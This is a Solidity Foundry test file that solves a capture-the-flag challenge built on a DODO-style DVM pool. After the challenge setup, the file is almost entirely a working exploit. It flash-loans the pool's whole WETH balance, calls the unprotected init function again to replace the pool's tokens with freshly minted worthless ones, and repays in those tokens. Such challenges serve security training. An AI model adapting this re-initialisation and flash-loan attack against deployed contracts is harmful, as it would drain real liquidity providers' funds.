// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFDeployment.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/Challenge.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;

    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}
contract MyToken is ERC20 {
    constructor() ERC20("My Token", "YT") {
        _mint(msg.sender, 10_000_000 ether);
    }
}

contract Solve is BaseTest {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    QuoteToken internal quoteToken;

    DVMLike internal dvm;

    function setUp() public override {
        super.setUp();
        
        vm.startBroadcast(system);

        payable(address(WETH)).call{value: 100 ether}(hex"");

        quoteToken = new QuoteToken();

        dvm = DVMLike(CLONE_FACTORY.clone(DVM_TEMPLATE));
        dvm.init(
            address(system),
            address(WETH),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        WETH.transfer(address(dvm), WETH.balanceOf(address(system)));
        quoteToken.transfer(address(dvm), quoteToken.balanceOf(address(system)) / 2);
        dvm.buyShares(address(system));

        challenge = address(new Challenge(address(dvm)));

        vm.stopBroadcast();

        vm.label( address(WETH),'WETH');
        vm.label(address(quoteToken), 'quoteToken');
        vm.label(address(dvm), 'dvm');
    }

    function test_Expoit() public {
        
        dvm.flashLoan(WETH.balanceOf(address(dvm)), 0, address(this), "0x00");
        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }

    function DVMFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();

        dvm.init(
            address(system),
            address(myToken1),
            address(myToken2),
            0,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            0,
            false
        );

        myToken1.transfer(msg.sender, 10_000_000 ether);
        myToken2.transfer(msg.sender, 10_000_000 ether);

    }
}
